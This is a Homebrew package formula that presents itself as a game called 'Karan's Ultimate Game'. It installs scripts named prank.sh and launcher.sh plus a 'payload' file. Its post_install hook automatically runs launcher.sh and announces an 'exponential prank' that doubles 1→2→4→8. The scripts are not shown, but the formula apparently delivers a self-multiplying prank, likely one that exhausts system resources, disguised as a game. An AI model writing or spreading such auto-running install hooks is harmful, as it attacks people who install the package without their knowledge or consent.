class Dingdong < Formula
  desc "🎭 Karan's Ultimate Game v3.8 - Exponential Doubling Edition"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "3.8.0"
  sha256 "d298b042c1e9e105d521f2a7be69e6cf355a7311587cec73810421eed7ffa118"

  def install
    bin.install "prank.sh"
    bin.install "launcher.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "🎭 Karan's Ultimate Game v3.8 - EXPONENTIAL DOUBLING!"
    ohai "📈 Growth pattern: 1→2→4→8→16→32→64..."
    
    system "#{bin}/launcher.sh"
    
    ohai "✅ Exponential prank launched!"
  end
end
